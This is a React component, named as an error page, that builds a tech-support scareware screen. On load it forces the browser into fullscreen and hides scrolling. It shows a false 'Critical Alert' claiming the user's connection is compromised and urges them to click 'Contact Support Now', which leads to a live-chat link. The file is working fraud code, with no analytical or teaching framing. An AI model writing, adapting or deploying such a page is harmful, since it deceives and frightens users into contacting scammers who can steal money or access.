import React, { useEffect } from "react";
import { Link } from "react-router-dom";
import error from "../assets/error_img.png";
import logo from "../assets/brand_logo.png";
import { FaExclamationTriangle } from "react-icons/fa";

const Error = () => {
  useEffect(() => {
    // Attempt to enter fullscreen mode
    const element = document.documentElement;
    if (element.requestFullscreen) {
      element.requestFullscreen().catch((err) => {
        console.error(
          `Error attempting to enable full-screen mode: ${err.message}`
        );
      });
    }
  }, []);

  return (
    <>
      <div className="container text-center my-5">
        <div className="logo-container">
          <img src={logo} alt="Brand Logo" className="logo" />
        </div>
        <h2 className="text-danger my-5 warning-text">
          <FaExclamationTriangle className="danger-icon" />
          <strong>Critical Alert:</strong> Your connection might be compromised.
          Immediate action is required. This could be due to a potential
          security breach or unauthorized access. Please contact support or
          secure your account immediately.
        </h2>
        <img src={error} alt="Error" className="error-image" />
        <br />
        <br />
        <Link
          to="ttps://tawk.to/chat/66a8eee332dca6db2cb7758a/1i41uaahk"
          className="btn btn-danger btn-lg btn-professional"
        >
          Contact Support Now
        </Link>
      </div>

      <style>
        {`
          body, html {
            overflow: hidden;
          }
          .logo-container {
            position: absolute;
            top: 10px;
            left: 10px;
            z-index: 10;
          }
          .logo {
            max-width: 60px;
            height: auto;
          }
          .danger-icon {
            color: #dc3545;
            margin-right: 8px;
          }
          .btn-professional {
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
            padding: 12px 24px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
          }
          .btn-professional:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 8px rgba(0,0,0,0.15);
          }
          .error-image {
            max-width: 55%;
            width: 100%;
            height: auto;
          }
          .warning-text {
            color: #dc3545;
            font-weight: bold;
            font-size: 1.2rem;
            margin-top: 2rem;
          }
          @media (max-width: 576px) {
            .error-image {
              max-width: 80%;
            }
            .logo {
              max-width: 40px;
            }
            .warning-text {
              font-size: 1rem;
              margin-top: 3rem;
            }
          }
        `}
      </style>
    </>
  );
};

export default Error;
